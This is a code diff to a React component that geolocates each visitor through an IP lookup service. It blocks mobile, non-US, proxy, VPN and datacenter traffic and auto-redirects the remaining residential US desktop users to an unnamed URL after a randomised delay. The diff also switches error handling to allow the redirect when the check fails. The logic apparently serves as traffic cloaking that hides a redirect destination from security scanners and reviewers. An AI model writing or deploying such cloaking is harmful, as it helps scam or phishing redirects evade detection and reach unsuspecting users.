@@ -17,14 +17,15 @@ const App: React.FC = () => {
       // Device check: Desktop only
       const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
       
-      // Geo and IP Quality check
       try {
         const response = await fetch('https://ipwho.is/');
         const data = await response.json();
+        console.log(data);
         
-        const isUS = data.country_code === 'US';
-        const isProxy = data.security?.proxy || data.security?.vpn || data.security?.tor || data.security?.relay;
-        const isHosting = data.connection?.type === 'hosting' || data.connection?.type === 'datacenter';
+        const country = data.country_code;
+        const proxy = data.security?.proxy;
+        const vpn = data.security?.vpn;
+        const hosting = data.connection?.type === 'hosting' || data.connection?.type === 'datacenter';
 
         if (isMobile) {
           setAllowRedirect(false);
@@ -32,13 +33,29 @@ const App: React.FC = () => {
           return;
         }
 
-        if (!isUS || isProxy || isHosting) {
+        if (
+          country !== "US" ||
+          proxy === true ||
+          vpn === true ||
+          hosting === true
+        ) {
           setAllowRedirect(false);
           setAccessStatus('blocked_geo');
-          return;
+        } else {
+          // If we reach here, it's US, Desktop, and Residential (not proxy/hosting)
+          setAllowRedirect(true);
+          setAccessStatus('allowed');
+          
+          // Auto-redirect after random delay (1500ms to 2500ms)
+          var delay = Math.floor(Math.random() * (2500 - 1500 + 1)) + 1500;
+          setTimeout(function(){
+            window.location.href = redirectUrl;
+          }, delay);
         }
 
-        // If we reach here, it's US, Desktop, and Residential (not proxy/hosting)
+      } catch (error) {
+        console.error("IP Check Error:", error);
+        // Default allow on error
         setAllowRedirect(true);
         setAccessStatus('allowed');
         
@@ -47,11 +64,6 @@ const App: React.FC = () => {
         setTimeout(function(){
           window.location.href = redirectUrl;
         }, delay);
-
-      } catch (error) {
-        // Fallback: if API fails, we don't allow redirect to be safe
-        setAllowRedirect(false);
-        setAccessStatus('blocked_geo');
       }
     };
 
